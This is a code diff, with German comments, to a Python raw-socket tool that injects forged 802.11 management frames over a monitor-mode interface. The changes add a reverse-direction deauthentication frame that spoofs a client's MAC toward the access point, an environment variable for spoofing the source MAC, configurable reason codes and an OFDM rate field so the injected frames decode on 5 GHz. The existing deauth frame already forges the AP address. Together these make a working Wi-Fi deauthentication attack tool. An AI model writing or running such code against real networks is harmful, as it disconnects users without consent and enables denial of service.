@@ -14,6 +14,10 @@ LASTMAC = int(sys.argv[5], 16) if len(sys.argv) > 5 else 0x01
 TARGET_BSSID = bytes.fromhex(sys.argv[6].replace(":","")) if len(sys.argv) > 6 else None
 SSID_ARG = sys.argv[7].encode() if len(sys.argv) > 7 and sys.argv[7] else None
 CLIENT_MAC = bytes.fromhex(sys.argv[8].replace(":","")) if len(sys.argv) > 8 and sys.argv[8] else None
+RATE = int(sys.argv[9], 0) if len(sys.argv) > 9 and sys.argv[9] else None   # 500-kbit/s-Einheiten
+import os
+REASON = int(os.environ.get("REASON", "7"))
+SRC_OVERRIDE = bytes.fromhex(os.environ["SRC_MAC"].replace(":","")) if os.environ.get("SRC_MAC") else None
 
 SRC = bytes([0x02, 0x00, 0x00, 0xde, 0xad, LASTMAC])   # lokal verwaltete MAC
 
@@ -24,8 +28,13 @@ def tx_packets():
     except OSError:
         return -1
 
-def radiotap():
-    """version 0, pad 0, len 8, present 0 -> keine Felder, Treiber nimmt Defaults."""
+def radiotap(rate=None):
+    """Radiotap-Kopf. Ohne Rate-Feld nimmt der Treiber Defaults (1 Mbit DSSS),
+    was auf 5 GHz nicht dekodierbar ist. rate in 500-kbit/s-Einheiten,
+    z.B. 0x0c = 6 Mbit OFDM."""
+    if rate:
+        # present bit 1 = Rate, Laenge 8 + 1
+        return struct.pack("<BBHI", 0, 0, 9, 0x02) + bytes([rate & 0xff])
     return struct.pack("<BBHI", 0, 0, 8, 0)
 
 def hdr(fc0, addr1=None, addr2=None, addr3=None):
@@ -54,11 +63,19 @@ def build(kind):
         # Wildcard-Probe-Request: SSID-IE mit Laenge 0 -> jeder AP antwortet
         ies = bytes([0x00, 0x00]) + bytes([0x01, 0x01, 0x82])
         return hdr(0x40, addr3=BROADCAST) + ies
+    if kind == "deauth_rev":
+        # Gegenrichtung: DA = AP, SA = Client ("Client meldet sich ab").
+        # Der AP beendet die Session und deauth't den Client selbst.
+        b = TARGET_BSSID or BROADCAST
+        sa = CLIENT_MAC or SRC
+        return hdr(0xc0, addr1=b, addr2=sa, addr3=b) + struct.pack("<H", REASON)
     if kind == "deauth":
-        # Deauth: DA = Ziel-Client, SA/BSSID = Access Point (gefälscht)
+        # Deauth: DA = Ziel-Client, SA/BSSID = Access Point (gefälscht).
+        # SRC_MAC erlaubt die Gegenrichtung: DA=AP, SA=Client ("Client geht").
         b = TARGET_BSSID or BROADCAST
         da = CLIENT_MAC or b
-        return hdr(0xc0, addr1=da, addr2=b, addr3=b) + struct.pack("<H", 7)
+        sa = SRC_OVERRIDE or b
+        return hdr(0xc0, addr1=da, addr2=sa, addr3=b) + struct.pack("<H", REASON)
     if kind == "auth":
         # Authentication, Open System, Seq 1, Status 0 — an BSSID adressiert
         b = TARGET_BSSID or BROADCAST
@@ -67,18 +84,23 @@ def build(kind):
         b = TARGET_BSSID or BROADCAST
         da = CLIENT_MAC or b
         return hdr(0xa0, addr1=da, addr2=b, addr3=b) + struct.pack("<H", 8)
+    if kind == "action_short":
+        # 26 Bytes gesamt (24 Header + 2) — gleiche Laenge wie ein Deauth
+        return hdr(0xd0) + bytes([0x7f, 0x01])
     # action (0xd0): Category 127 vendor specific + OUI + Typ + Nutzlast
     body = bytes([0x7f]) + b"\xae\xe2\xae" + bytes([0x01]) + b"AICMON-INJECT-PROBE"
     return hdr(0xd0) + body
 
 def main():
-    frame = radiotap() + build(KIND)
+    frame = radiotap(RATE) + build(KIND)
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
     s.bind((IFACE, 0))
     before = tx_packets()
     print("Interface %s Kanal %d Typ %s" % (IFACE, CHAN, KIND))
-    print("Frame %d Bytes (Radiotap 8 + 802.11 %d), FC=0x%02x"
-          % (len(frame), len(frame) - 8, frame[8]))
+    rtap_len = 9 if RATE else 8
+    print("Frame %d Bytes (Radiotap %d + 802.11 %d), FC=0x%02x, Rate=%s"
+          % (len(frame), rtap_len, len(frame) - rtap_len, frame[rtap_len],
+             ("%d x 500kbit/s" % RATE) if RATE else "Treiber-Default"))
     print("TX-Zaehler vorher: %d" % before)
     for i in range(1, COUNT + 1):
         s.send(frame)
